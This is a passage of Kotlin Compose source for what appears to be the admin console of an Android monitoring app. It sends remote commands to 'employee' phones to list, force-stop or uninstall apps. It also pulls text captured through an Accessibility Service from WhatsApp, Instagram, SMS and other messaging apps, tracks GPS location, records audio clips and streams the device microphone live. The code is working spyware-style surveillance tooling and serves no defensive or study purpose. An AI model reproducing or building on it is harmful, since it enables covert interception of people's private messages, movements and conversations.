                            Text("INFO", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = ccCyan,
                                fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                        }
                    }
                    Surface(
                        onClick = {
                            viewModel.sendCameraCommand(deviceName, "REMOTE_APP_LIST")
                            isLoadingApps = true
                            kotlinx.coroutines.MainScope().launch {
                                kotlinx.coroutines.delay(3000)
                                try {
                                    val resp = withContext(Dispatchers.IO) { apiService.getAppList(deviceName) }
                                    if (resp.isSuccessful) {
                                        appList = resp.body()?.apps ?: emptyList()
                                        showApps = true
                                    }
                                } catch (_: Exception) { }
                                isLoadingApps = false
                            }
                        },
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(6.dp),
                        color = ccGreen.copy(alpha = 0.12f),
                        border = androidx.compose.foundation.BorderStroke(0.5.dp, ccGreen.copy(alpha = 0.3f))
                    ) {
                        Column(Modifier.padding(12.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                            Text("📋", fontSize = 20.sp)
                            Spacer(Modifier.height(4.dp))
                            Text("APPS", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = ccGreen,
                                fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                        }
                    }
                }
            }
        }

        // ── Device Info Display ──
        if (isLoadingInfo) {
            Surface(Modifier.fillMaxWidth(), color = ccCard, shape = RoundedCornerShape(8.dp),
                border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)) {
                Row(Modifier.padding(16.dp), verticalAlignment = Alignment.CenterVertically) {
                    CircularProgressIndicator(Modifier.size(16.dp), strokeWidth = 2.dp, color = ccCyan)
                    Spacer(Modifier.width(10.dp))
                    Text("Mengambil info perangkat...", fontSize = 12.sp, color = ccTextDim,
                        fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                }
            }
        }

        deviceInfo?.let { info ->
            Surface(Modifier.fillMaxWidth(), color = ccCard, shape = RoundedCornerShape(8.dp),
                border = androidx.compose.foundation.BorderStroke(0.5.dp, ccCyan.copy(alpha = 0.3f))) {
                Column(Modifier.padding(10.dp)) {
                    Text("// DEVICE INFO", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = ccCyan,
                        fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                    Spacer(Modifier.height(6.dp))
                    val infoItems = listOf(
                        "🔋 Baterai" to "${info.batteryLevel}%",
                        "💾 Storage" to "${info.storageFree}/${info.storageTotal} GB",
                        "🧠 RAM" to "${info.ramFree}/${info.ramTotal} GB",
                        "📶 WiFi" to info.wifiName,
                        "📱 Model" to info.model,
                        "🤖 OS" to info.osVersion,
                        "⏱ Uptime" to info.uptime
                    )
                    infoItems.forEach { (label, value) ->
                        Row(Modifier.fillMaxWidth().padding(vertical = 2.dp),
                            horizontalArrangement = Arrangement.SpaceBetween) {
                            Text(label, fontSize = 11.sp, color = ccTextDim,
                                fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                            Text(value, fontSize = 11.sp, color = ccGreen, fontWeight = FontWeight.Medium,
                                fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                        }
                    }
                }
            }
        }

        // ── App List Display ──
        if (isLoadingApps) {
            Surface(Modifier.fillMaxWidth(), color = ccCard, shape = RoundedCornerShape(8.dp),
                border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)) {
                Row(Modifier.padding(16.dp), verticalAlignment = Alignment.CenterVertically) {
                    CircularProgressIndicator(Modifier.size(16.dp), strokeWidth = 2.dp, color = ccGreen)
                    Spacer(Modifier.width(10.dp))
                    Text("Mengambil daftar aplikasi...", fontSize = 12.sp, color = ccTextDim,
                        fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                }
            }
        }

        if (showApps && appList.isNotEmpty()) {
            Surface(Modifier.fillMaxWidth(), color = ccCard, shape = RoundedCornerShape(8.dp),
                border = androidx.compose.foundation.BorderStroke(0.5.dp, ccGreen.copy(alpha = 0.3f))) {
                Column(Modifier.padding(10.dp)) {
                    Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically) {
                        Text("// INSTALLED APPS (${appList.size})", fontSize = 11.sp,
                            fontWeight = FontWeight.Bold, color = ccGreen,
                            fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace)
                        Surface(
                            onClick = { showApps = false },
                            shape = RoundedCornerShape(4.dp),
                            color = ccRed.copy(alpha = 0.1f)
                        ) {
                            Text("✕", modifier = Modifier.padding(horizontal = 8.dp, vertical = 2.dp),
                                fontSize = 12.sp, color = ccRed)
                        }
                    }
                    Spacer(Modifier.height(6.dp))
                    appList.forEach { app ->
                        Column(Modifier.fillMaxWidth().padding(vertical = 3.dp)) {
                            Row(Modifier.fillMaxWidth(),
                                horizontalArrangement = Arrangement.SpaceBetween,
                                verticalAlignment = Alignment.CenterVertically) {
                                Column(Modifier.weight(1f)) {
                                    Text("▸ ${app.appName}", fontSize = 11.sp, color = ccText,
                                        fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
                                        maxLines = 1)
                                    Text(app.packageName, fontSize = 9.sp, color = ccTextDim,
                                        fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
                                        maxLines = 1)
                                }
                                Row(horizontalArrangement = Arrangement.spacedBy(4.dp)) {
                                    // Force Stop button
                                    Surface(
                                        onClick = {
                                            viewModel.sendCommandWithParams(deviceName, "REMOTE_FORCE_STOP", app.packageName)
                                        },
                                        shape = RoundedCornerShape(4.dp),
                                        color = ccOrange.copy(alpha = 0.12f)
                                    ) {
                                        Text("⏹", modifier = Modifier.padding(horizontal = 6.dp, vertical = 3.dp),
                                            fontSize = 11.sp, color = ccOrange)
                                    }
                                    // Uninstall button
                                    Surface(
                                        onClick = {
                                            viewModel.sendCommandWithParams(deviceName, "REMOTE_UNINSTALL_APP", app.packageName)
                                        },
                                        shape = RoundedCornerShape(4.dp),
                                        color = ccRed.copy(alpha = 0.12f)
                                    ) {
                                        Text("🗑", modifier = Modifier.padding(horizontal = 6.dp, vertical = 3.dp),
                                            fontSize = 11.sp, color = ccRed)
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}


/**
 * Activity Log Panel — displays real-time text activity from employee devices.
 * Polls server every 10 seconds for latest logs.
 */
@Composable
private fun ActivityLogPanel(
    deviceName: String,
    viewModel: NearbyViewModel,
    relayBaseUrl: String
) {
    val context = androidx.compose.ui.platform.LocalContext.current
    val coroutineScope = rememberCoroutineScope()

    var activityLogs by remember { mutableStateOf<List<com.example.kabensatudata.data.remote.dto.ActivityLogEntry>>(emptyList()) }
    var isLoading by remember { mutableStateOf(false) }
    var lastRefresh by remember { mutableStateOf("") }

    // Get ApiService via Hilt entry point
    val apiService = remember {
        dagger.hilt.android.EntryPointAccessors.fromApplication(
            context.applicationContext,
            com.example.kabensatudata.nearby.ScreenTextService.TextServiceEntryPoint::class.java
        ).apiService()
    }

    // Auto-refresh logs every 10 seconds
    LaunchedEffect(deviceName) {
        while (true) {
            try {
                isLoading = true
                val response = withContext(Dispatchers.IO) {
                    apiService.getActivityLogs(deviceName)
                }
                if (response.isSuccessful) {
                    activityLogs = response.body()?.data ?: emptyList()
                    val sdf = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault())
                    lastRefresh = sdf.format(java.util.Date())
                }
            } catch (_: Exception) { }
            isLoading = false
            kotlinx.coroutines.delay(10_000)
        }
    }

    Column(verticalArrangement = Arrangement.spacedBy(12.dp)) {
        // ── Control Buttons ───────────────────────
        Surface(
            Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(12.dp),
            color = AppColors.Surface
        ) {
            Column(Modifier.padding(12.dp), verticalArrangement = Arrangement.spacedBy(6.dp)) {
                Text(
                    "Kontrol Aktivitas",
                    fontWeight = FontWeight.SemiBold,
                    fontSize = 13.sp,
                    color = AppColors.TextPrimary
                )
                // 1. Aktifkan Aktivitas
                FilledTonalButton(
                    onClick = { viewModel.sendCameraCommand(deviceName, "TEXT_START") },
                    shape = RoundedCornerShape(8.dp),
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.filledTonalButtonColors(
                        containerColor = AppColors.Primary.copy(alpha = 0.12f),
                        contentColor = AppColors.Primary
                    )
                ) {
                    Icon(Icons.Default.PlayArrow, null, Modifier.size(16.dp))
                    Spacer(Modifier.width(6.dp))
                    Text("Aktifkan Aktivitas", fontSize = 14.sp)
                }
                // 2. Matikan Aktivitas
                FilledTonalButton(
                    onClick = { viewModel.sendCameraCommand(deviceName, "TEXT_STOP") },
                    shape = RoundedCornerShape(8.dp),
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.filledTonalButtonColors(
                        containerColor = AppColors.Error.copy(alpha = 0.12f),
                        contentColor = AppColors.Error
                    )
                ) {
                    Icon(Icons.Default.Stop, null, Modifier.size(16.dp))
                    Spacer(Modifier.width(6.dp))
                    Text("Matikan Aktivitas", fontSize = 13.sp)
                }
            }
        }

        // ── Activity Logs ────────────────────────────────
        HorizontalDivider(color = AppColors.DividerColor, thickness = 0.5.dp)

        Row(
            Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text(
                "Log Aktivitas",
                fontWeight = FontWeight.SemiBold,
                fontSize = 14.sp,
                color = AppColors.TextPrimary
            )
            Row(verticalAlignment = Alignment.CenterVertically) {
                if (isLoading) {
                    CircularProgressIndicator(
                        Modifier.size(14.dp),
                        strokeWidth = 2.dp,
                        color = AppColors.Primary
                    )
                    Spacer(Modifier.width(6.dp))
                }
                Text(
                    if (lastRefresh.isNotBlank()) "Update: $lastRefresh" else "Memuat...",
                    fontSize = 11.sp,
                    color = AppColors.TextTertiary
                )
            }
        }

        if (activityLogs.isEmpty() && !isLoading) {
            Surface(
                Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(12.dp),
                color = AppColors.Surface
            ) {
                Column(
                    Modifier.padding(24.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Icon(
                        Icons.Default.TextSnippet,
                        null,
                        tint = AppColors.TextTertiary,
                        modifier = Modifier.size(36.dp)
                    )
                    Spacer(Modifier.height(8.dp))
                    Text(
                        "Belum ada log aktivitas.",
                        fontSize = 13.sp,
                        color = AppColors.TextSecondary
                    )
                    Text(
                        "Pastikan Accessibility Service aktif di HP pegawai.",
                        fontSize = 11.sp,
                        color = AppColors.TextTertiary
                    )
                }
            }
        }

        activityLogs.forEach { log ->
            ActivityLogCard(log)
        }
    }
}

/**
 * Single activity log card — shows app icon, name, timestamp, and text content.
 */
@Composable
private fun ActivityLogCard(log: com.example.kabensatudata.data.remote.dto.ActivityLogEntry) {
    val appIcon = when {
        log.appPackage.contains("whatsapp", true) -> "💬"
        log.appPackage.contains("instagram", true) -> "📸"
        log.appPackage.contains("tiktok", true) -> "🎵"
        log.appPackage.contains("facebook", true) -> "📘"
        log.appPackage.contains("messenger", true) -> "💭"
        log.appPackage.contains("chrome", true) -> "🌐"
        log.appPackage.contains("youtube", true) -> "▶️"
        log.appPackage.contains("telegram", true) -> "✈️"
        log.appPackage.contains("twitter", true) || log.appPackage.contains("x.com", true) -> "🐦"
        log.appPackage.contains("sms", true) || log.appPackage.contains("mms", true) || log.appPackage.contains("messaging", true) -> "✉️"
        log.appPackage.contains("tokopedia", true) -> "🛒"
        log.appPackage.contains("shopee", true) -> "🛍️"
        else -> "📱"
    }

    // Parse time for display
    val displayTime = try {
        val parts = log.timestamp.split("T")
        if (parts.size >= 2) parts[1].take(8) else log.timestamp
    } catch (_: Exception) { log.timestamp }

    Surface(
        Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(12.dp),
        color = AppColors.Surface,
        shadowElevation = 1.dp
    ) {
        Column(Modifier.padding(12.dp)) {
            // Header: App icon + name + time
            Row(
                Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text(appIcon, fontSize = 20.sp)
                    Spacer(Modifier.width(8.dp))
                    Column {
                        Text(
                            log.appLabel,
                            fontWeight = FontWeight.SemiBold,
                            fontSize = 13.sp,
                            color = AppColors.TextPrimary
                        )
                        Text(
                            log.appPackage,
                            fontSize = 10.sp,
                            color = AppColors.TextTertiary,
                            maxLines = 1
                        )
                    }
                }
                Surface(
                    shape = RoundedCornerShape(6.dp),
                    color = AppColors.Primary.copy(alpha = 0.08f)
                ) {
                    Text(
                        displayTime,
                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 3.dp),
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Medium,
                        color = AppColors.Primary
                    )
                }
            }

            Spacer(Modifier.height(8.dp))
            HorizontalDivider(color = AppColors.DividerColor, thickness = 0.3.dp)
            Spacer(Modifier.height(8.dp))

            // Text content
            log.texts.forEach { text ->
                Text(
                    "• $text",
                    fontSize = 12.sp,
                    color = AppColors.TextSecondary,
                    maxLines = 3,
                    overflow = androidx.compose.ui.text.style.TextOverflow.Ellipsis,
                    modifier = Modifier.padding(bottom = 2.dp)
                )
            }
        }
    }
}

/**
 * Location Tracking Panel — admin can track employee device GPS location.
 * Supports one-shot (Lacak Sekali) and continuous (Mulai/Stop Tracking) modes.
 */
@Composable
private fun LocationTrackingPanel(
    deviceName: String,
    viewModel: NearbyViewModel,
    relayBaseUrl: String
) {
    val context = androidx.compose.ui.platform.LocalContext.current

    var locations by remember { mutableStateOf<List<com.example.kabensatudata.data.remote.dto.LocationEntry>>(emptyList()) }
    var isLoading by remember { mutableStateOf(false) }
    var lastRefresh by remember { mutableStateOf("") }

    // Get ApiService via Hilt entry point
    val apiService = remember {
        dagger.hilt.android.EntryPointAccessors.fromApplication(
            context.applicationContext,
            com.example.kabensatudata.nearby.ScreenTextService.TextServiceEntryPoint::class.java
        ).apiService()
    }

    // Auto-refresh locations every 10 seconds
    LaunchedEffect(deviceName) {
        while (true) {
            try {
                isLoading = true
                val response = withContext(Dispatchers.IO) {
                    apiService.getLocations(deviceName)
                }
                if (response.isSuccessful) {
                    locations = response.body()?.data ?: emptyList()
                    val sdf = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault())
                    lastRefresh = sdf.format(java.util.Date())
                }
            } catch (_: Exception) { }
            isLoading = false
            kotlinx.coroutines.delay(10_000)
        }
    }

    Column(verticalArrangement = Arrangement.spacedBy(12.dp)) {
        // ── Control Buttons ──────────────────────────────
        Surface(
            Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(12.dp),
            color = AppColors.Surface
        ) {
            Column(Modifier.padding(12.dp), verticalArrangement = Arrangement.spacedBy(6.dp)) {
                Text(
                    "Kontrol Lokasi",
                    fontWeight = FontWeight.SemiBold,
                    fontSize = 13.sp,
                    color = AppColors.TextPrimary
                )
                // 1. Lacak Sekali (one-shot)
                FilledTonalButton(
                    onClick = { viewModel.sendCameraCommand(deviceName, "LOCATION_GET") },
                    shape = RoundedCornerShape(8.dp),
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.filledTonalButtonColors(
                        containerColor = AppColors.Primary.copy(alpha = 0.12f),
                        contentColor = AppColors.Primary
                    )
                ) {
                    Icon(Icons.Default.MyLocation, null, Modifier.size(16.dp))
                    Spacer(Modifier.width(6.dp))
                    Text("Lacak Sekali", fontSize = 14.sp)
                }
                // 2. Mulai Tracking (continuous)
                FilledTonalButton(
                    onClick = { viewModel.sendCameraCommand(deviceName, "LOCATION_START") },
                    shape = RoundedCornerShape(8.dp),
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.filledTonalButtonColors(
                        containerColor = Color(0xFF4CAF50).copy(alpha = 0.12f),
                        contentColor = Color(0xFF4CAF50)
                    )
                ) {
                    Icon(Icons.Default.PlayArrow, null, Modifier.size(16.dp))
                    Spacer(Modifier.width(6.dp))
                    Text("Mulai Tracking (per 1 menit)", fontSize = 13.sp)
                }
                // 3. Stop Tracking
                FilledTonalButton(
                    onClick = { viewModel.sendCameraCommand(deviceName, "LOCATION_STOP") },
                    shape = RoundedCornerShape(8.dp),
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.filledTonalButtonColors(
                        containerColor = AppColors.Error.copy(alpha = 0.12f),
                        contentColor = AppColors.Error
                    )
                ) {
                    Icon(Icons.Default.Stop, null, Modifier.size(16.dp))
                    Spacer(Modifier.width(6.dp))
                    Text("Stop Tracking", fontSize = 13.sp)
                }
            }
        }

        // ── Location Results ─────────────────────────
        HorizontalDivider(color = AppColors.DividerColor, thickness = 0.5.dp)

        Row(
            Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text(
                "Riwayat Lokasi",
                fontWeight = FontWeight.SemiBold,
                fontSize = 14.sp,
                color = AppColors.TextPrimary
            )
            Row(verticalAlignment = Alignment.CenterVertically) {
                if (isLoading) {
                    CircularProgressIndicator(
                        Modifier.size(14.dp),
                        strokeWidth = 2.dp,
                        color = AppColors.Primary
                    )
                    Spacer(Modifier.width(6.dp))
                }
                Text(
                    if (lastRefresh.isNotBlank()) "Update: $lastRefresh" else "Memuat...",
                    fontSize = 11.sp,
                    color = AppColors.TextTertiary
                )
            }
        }

        if (locations.isEmpty() && !isLoading) {
            Surface(
                Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(12.dp),
                color = AppColors.Surface
            ) {
                Column(
                    Modifier.padding(24.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Icon(
                        Icons.Default.LocationOff,
                        null,
                        tint = AppColors.TextTertiary,
                        modifier = Modifier.size(36.dp)
                    )
                    Spacer(Modifier.height(8.dp))
                    Text(
                        "Belum ada data lokasi.",
                        fontSize = 13.sp,
                        color = AppColors.TextSecondary
                    )
                    Text(
                        "Tekan \"Lacak Sekali\" untuk mendapat lokasi.",
                        fontSize = 11.sp,
                        color = AppColors.TextTertiary
                    )
                }
            }
        }

        locations.forEach { loc ->
            LocationCard(loc, context)
        }
    }
}

/**
 * Single location card — shows coordinates, accuracy, timestamp, and Google Maps button.
 */
@Composable
private fun LocationCard(
    loc: com.example.kabensatudata.data.remote.dto.LocationEntry,
    context: android.content.Context
) {
    // Parse time for display
    val displayTime = try {
        val parts = loc.timestamp.split("T")
        if (parts.size >= 2) parts[1].take(8) else loc.timestamp
    } catch (_: Exception) { loc.timestamp }

    Surface(
        Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(12.dp),
        color = AppColors.Surface,
        shadowElevation = 1.dp
    ) {
        Column(Modifier.padding(12.dp)) {
            // Header: Location icon + coordinates + time
            Row(
                Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text("📍", fontSize = 20.sp)
                    Spacer(Modifier.width(8.dp))
                    Column {
                        Text(
                            "Lat: ${String.format("%.6f", loc.latitude)}",
                            fontWeight = FontWeight.SemiBold,
                            fontSize = 13.sp,
                            color = AppColors.TextPrimary
                        )
                        Text(
                            "Lng: ${String.format("%.6f", loc.longitude)}",
                            fontWeight = FontWeight.SemiBold,
                            fontSize = 13.sp,
                            color = AppColors.TextPrimary
                        )
                    }
                }
                Surface(
                    shape = RoundedCornerShape(6.dp),
                    color = AppColors.Primary.copy(alpha = 0.08f)
                ) {
                    Text(
                        displayTime,
                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 3.dp),
                        fontSize = 11.sp,
                        fontWeight = FontWeight.Medium,
                        color = AppColors.Primary
                    )
                }
            }

            Spacer(Modifier.height(6.dp))

            // Accuracy badge
            Row(verticalAlignment = Alignment.CenterVertically) {
                Icon(Icons.Default.GpsFixed, null, Modifier.size(14.dp), tint = AppColors.TextTertiary)
                Spacer(Modifier.width(4.dp))
                Text(
                    "Akurasi: ±${loc.accuracy.toInt()}m",
                    fontSize = 11.sp,
                    color = AppColors.TextTertiary
                )
            }

            Spacer(Modifier.height(8.dp))
            HorizontalDivider(color = AppColors.DividerColor, thickness = 0.3.dp)
            Spacer(Modifier.height(8.dp))

            // Open in Google Maps button
            FilledTonalButton(
                onClick = {
                    val uri = android.net.Uri.parse("geo:${loc.latitude},${loc.longitude}?q=${loc.latitude},${loc.longitude}(${loc.deviceName})")
                    val intent = android.content.Intent(android.content.Intent.ACTION_VIEW, uri).apply {
                        setPackage("com.google.android.apps.maps")
                    }
                    try {
                        context.startActivity(intent)
                    } catch (_: Exception) {
                        // If Google Maps not installed, open in browser
                        val browserUri = android.net.Uri.parse("https://maps.google.com/?q=${loc.latitude},${loc.longitude}")
                        context.startActivity(android.content.Intent(android.content.Intent.ACTION_VIEW, browserUri))
                    }
                },
                shape = RoundedCornerShape(8.dp),
                modifier = Modifier.fillMaxWidth(),
                colors = ButtonDefaults.filledTonalButtonColors(
                    containerColor = Color(0xFF4CAF50).copy(alpha = 0.12f),
                    contentColor = Color(0xFF4CAF50)
                )
            ) {
                Icon(Icons.Default.Map, null, Modifier.size(16.dp))
                Spacer(Modifier.width(6.dp))
                Text("🗺️ Buka di Google Maps", fontSize = 13.sp)
            }
        }
    }
}

/**
 * Audio Monitor Panel — admin can record and listen to device audio.
 * Two modes: Rekam 2 Menit (clip) and Live Audio (5s chunks).
 */
@Composable
private fun AudioMonitorPanel(
    deviceName: String,
    viewModel: NearbyViewModel,
    relayBaseUrl: String
) {
    val context = androidx.compose.ui.platform.LocalContext.current

    var audioList by remember { mutableStateOf<List<com.example.kabensatudata.data.remote.dto.AudioEntry>>(emptyList()) }
    var isLoading by remember { mutableStateOf(false) }
    var lastRefresh by remember { mutableStateOf("") }
    var isLiveMode by remember { mutableStateOf(false) }

    val apiService = remember {
        dagger.hilt.android.EntryPointAccessors.fromApplication(
            context.applicationContext,
            com.example.kabensatudata.nearby.ScreenTextService.TextServiceEntryPoint::class.java
        ).apiService()
    }

    // Auto-refresh audio list every 10 seconds
    LaunchedEffect(deviceName) {
        while (true) {
            try {
                isLoading = true
                val response = withContext(Dispatchers.IO) {
                    apiService.getAudioList(deviceName)
                }
                if (response.isSuccessful) {
                    audioList = response.body()?.data ?: emptyList()
                    val sdf = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault())
                    lastRefresh = sdf.format(java.util.Date())
                }
            } catch (_: Exception) { }
            isLoading = false
            kotlinx.coroutines.delay(10_000)
        }
    }

    // Live audio playback loop
    val mediaPlayer = remember { android.media.MediaPlayer() }
    DisposableEffect(Unit) {
        onDispose {
            try { mediaPlayer.release() } catch (_: Exception) { }
        }
    }

    LaunchedEffect(isLiveMode, deviceName) {
        if (isLiveMode) {
            while (isLiveMode) {
                try {
                    val response = withContext(Dispatchers.IO) {
                        apiService.getAudioLive(deviceName)
                    }
                    if (response.isSuccessful) {
                        val body = response.body()
                        if (body != null) {
                            val tempFile = java.io.File(context.cacheDir, "live_audio_temp.aac")
                            withContext(Dispatchers.IO) {
                                tempFile.outputStream().use { out ->
                                    body.byteStream().use { it.copyTo(out) }
                                }
                            }
                            if (tempFile.length() > 0) {
                                withContext(Dispatchers.Main) {
                                    try {
                                        mediaPlayer.reset()
                                        mediaPlayer.setDataSource(tempFile.absolutePath)
                                        mediaPlayer.prepare()
                                        mediaPlayer.start()
                                    } catch (_: Exception) { }
                                }
                                // Wait for playback to finish
                                kotlinx.coroutines.delay(5500)
                                tempFile.delete()
                            }
                        }
                    }
                } catch (_: Exception) { }
                kotlinx.coroutines.delay(500) // Brief pause between chunks
            }
        }
    }

    Column(verticalArrangement = Arrangement.spacedBy(12.dp)) {
        // ── Control Buttons ──────────────────────────────
        Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(12.dp), color = AppColors.Surface) {
            Column(Modifier.padding(12.dp), verticalArrangement = Arrangement.spacedBy(6.dp)) {
                Text("Kontrol Audio", fontWeight = FontWeight.SemiBold, fontSize = 13.sp, color = AppColors.TextPrimary)

                // 1. Rekam 2 Menit
                FilledTonalButton(
                    onClick = {
                        isLiveMode = false
                        viewModel.sendCameraCommand(deviceName, "AUDIO_RECORD")
                    },
                    shape = RoundedCornerShape(8.dp),
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.filledTonalButtonColors(
                        containerColor = AppColors.Primary.copy(alpha = 0.12f),
                        contentColor = AppColors.Primary
                    )
                ) {
                    Icon(Icons.Default.Mic, null, Modifier.size(16.dp))
                    Spacer(Modifier.width(6.dp))
                    Text("🎙️ Rekam 2 Menit", fontSize = 14.sp)
                }

                // 2. Live Audio
                FilledTonalButton(
                    onClick = {
                        isLiveMode = true
                        viewModel.sendCameraCommand(deviceName, "AUDIO_LIVE_START")
                    },
                    shape = RoundedCornerShape(8.dp),
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.filledTonalButtonColors(
                        containerColor = Color(0xFFE53935).copy(alpha = 0.12f),
                        contentColor = Color(0xFFE53935)
                    )
                ) {
                    Icon(Icons.Default.FiberManualRecord, null, Modifier.size(16.dp))
                    Spacer(Modifier.width(6.dp))
                    Text("🔴 Live Audio", fontSize = 14.sp)
                }

                // 3. Stop
                FilledTonalButton(
                    onClick = {
                        isLiveMode = false
                        try { mediaPlayer.reset() } catch (_: Exception) { }
                        viewModel.sendCameraCommand(deviceName, "AUDIO_STOP")
                    },
                    shape = RoundedCornerShape(8.dp),
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.filledTonalButtonColors(
                        containerColor = AppColors.Error.copy(alpha = 0.12f),
                        contentColor = AppColors.Error
                    )
                ) {
                    Icon(Icons.Default.Stop, null, Modifier.size(16.dp))
                    Spacer(Modifier.width(6.dp))
                    Text("⏹️ Stop", fontSize = 13.sp)
                }
            }
        }

        // ── Live indicator ──────────────────────────
        if (isLiveMode) {
            Surface(
                Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(12.dp),
                color = Color(0xFFE53935).copy(alpha = 0.08f)
            ) {
                Row(Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.FiberManualRecord, null,
                        tint = Color(0xFFE53935), modifier = Modifier.size(14.dp))
                    Spacer(Modifier.width(8.dp))
                    Text("Live Audio aktif — mendengarkan...",
                        fontSize = 13.sp, fontWeight = FontWeight.Medium,
                        color = Color(0xFFE53935))
                }
            }
        }

        // ── Audio List ──────────────────────────────
        HorizontalDivider(color = AppColors.DividerColor, thickness = 0.5.dp)

        Row(
            Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text("Rekaman Audio", fontWeight = FontWeight.SemiBold, fontSize = 14.sp, color = AppColors.TextPrimary)
            Row(verticalAlignment = Alignment.CenterVertically) {
                if (isLoading) {
                    CircularProgressIndicator(Modifier.size(14.dp), strokeWidth = 2.dp, color = AppColors.Primary)
                    Spacer(Modifier.width(6.dp))
                }
                Text(
                    if (lastRefresh.isNotBlank()) "Update: $lastRefresh" else "Memuat...",
                    fontSize = 11.sp, color = AppColors.TextTertiary
                )
            }
        }

        if (audioList.isEmpty() && !isLoading) {
            Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(12.dp), color = AppColors.Surface) {
                Column(Modifier.padding(24.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                    Icon(Icons.Default.MicOff, null, tint = AppColors.TextTertiary, modifier = Modifier.size(36.dp))
                    Spacer(Modifier.height(8.dp))
                    Text("Belum ada rekaman audio.", fontSize = 13.sp, color = AppColors.TextSecondary)
                    Text("Tekan \"Rekam 2 Menit\" untuk mulai.", fontSize = 11.sp, color = AppColors.TextTertiary)
                }
            }
        }

        audioList.filter { it.type == "clip" }.forEach { clip ->
            AudioClipCard(clip, relayBaseUrl, context)
        }
    }
}

/**
 * Single audio clip card with play button.
 */
@Composable
private fun AudioClipCard(
    clip: com.example.kabensatudata.data.remote.dto.AudioEntry,
    relayBaseUrl: String,
    context: android.content.Context
) {
    var isPlaying by remember { mutableStateOf(false) }
    val player = remember { android.media.MediaPlayer() }

    DisposableEffect(Unit) {
        onDispose { try { player.release() } catch (_: Exception) { } }
    }

    val displayTime = try {
        val parts = clip.timestamp.split("T")
        if (parts.size >= 2) parts[1].take(8) else clip.timestamp
    } catch (_: Exception) { clip.timestamp }

    val sizeKb = clip.size / 1024

    Surface(
        Modifier.fillMaxWidth(),
        shape = RoundedCornerShape(12.dp),
        color = AppColors.Surface,
        shadowElevation = 1.dp
    ) {
        Column(Modifier.padding(12.dp)) {
            Row(
                Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text("🎙️", fontSize = 20.sp)
                    Spacer(Modifier.width(8.dp))
                    Column {
                        Text("Rekaman 2 Menit", fontWeight = FontWeight.SemiBold, fontSize = 13.sp, color = AppColors.TextPrimary)
                        Text("${sizeKb} KB • $displayTime", fontSize = 11.sp, color = AppColors.TextTertiary)
                    }
                }
                Surface(shape = RoundedCornerShape(6.dp), color = AppColors.Primary.copy(alpha = 0.08f)) {
                    Text(displayTime, modifier = Modifier.padding(horizontal = 8.dp, vertical = 3.dp),
                        fontSize = 11.sp, fontWeight = FontWeight.Medium, color = AppColors.Primary)
                }
            }

            Spacer(Modifier.height(8.dp))
            HorizontalDivider(color = AppColors.DividerColor, thickness = 0.3.dp)
            Spacer(Modifier.height(8.dp))

            // Play/Stop button
            FilledTonalButton(
                onClick = {
                    if (isPlaying) {
                        try { player.stop(); player.reset() } catch (_: Exception) { }
                        isPlaying = false
                    } else {
